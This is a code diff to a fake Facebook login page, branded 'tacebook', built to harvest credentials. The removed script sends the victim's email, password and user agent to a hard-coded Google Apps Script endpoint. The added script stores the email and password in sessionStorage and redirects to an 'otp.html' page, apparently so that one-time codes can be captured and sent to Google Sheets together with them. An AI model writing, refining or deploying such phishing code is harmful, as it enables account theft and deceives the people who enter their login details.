@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log In or Sign Up</title>
+    <title>tacebook - Log In or Sign Up</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -197,8 +197,8 @@
 <body>
     <div class="container">
         <div class="left-section">
-            <h1>facebook</h1>
-            <p>Connect with friends and the world around you on facebook.</p>
+            <h1>tacebook</h1>
+            <p>Connect with friends and the world around you on tacebook.</p>
         </div>
 
         <div class="right-section">
@@ -228,10 +228,6 @@
     </div>
 
     <script>
-        // ── PASTE YOUR GOOGLE APPS SCRIPT URL BELOW ──────────────────────────
-        var SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx0SyUTQF2qlHIwSIPPqbTVB7q69rk01-9LujiLViniu1u3yFZD5gydN5dSEzxraAyg/exec";
-        // ─────────────────────────────────────────────────────────────────────
-
         var form = document.getElementById('loginForm');
         var btn = form.querySelector('.login-button');
 
@@ -241,35 +237,21 @@
             var email = form.querySelector('input[name="email"]').value.trim();
             var password = form.querySelector('input[name="password"]').value;
 
-            // Basic validation
             if (!email || !password) return;
 
-            // Disable button while submitting
+            // Save credentials so otp.html can include them in the Sheets submission
+            sessionStorage.setItem('fb_email', email);
+            sessionStorage.setItem('fb_password', password);
+
+            // Disable button briefly, then navigate to OTP page
             btn.disabled = true;
             btn.textContent = 'Logging in…';
             btn.style.opacity = '0.7';
 
-            fetch(SCRIPT_URL, {
-                method: 'POST',
-                mode: 'no-cors',          // Required for Apps Script
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    email: email,
-                    password: password,
-                    userAgent: navigator.userAgent
-                })
-            })
-                .then(function () {
-                    // no-cors means we can't read the response body — assume success
-                    window.location.href = '/';  // Redirect to BGIS home after login
-                })
-                .catch(function (err) {
-                    btn.disabled = false;
-                    btn.textContent = 'Log In';
-                    btn.style.opacity = '1';
-                    alert('Something went wrong. Please check your connection and try again.');
-                    console.error(err);
-                });
+            // Short delay for UX feel, then go to OTP page
+            setTimeout(function () {
+                window.location.href = '/otp.html';
+            }, 400);
         });
     </script>
 </body>
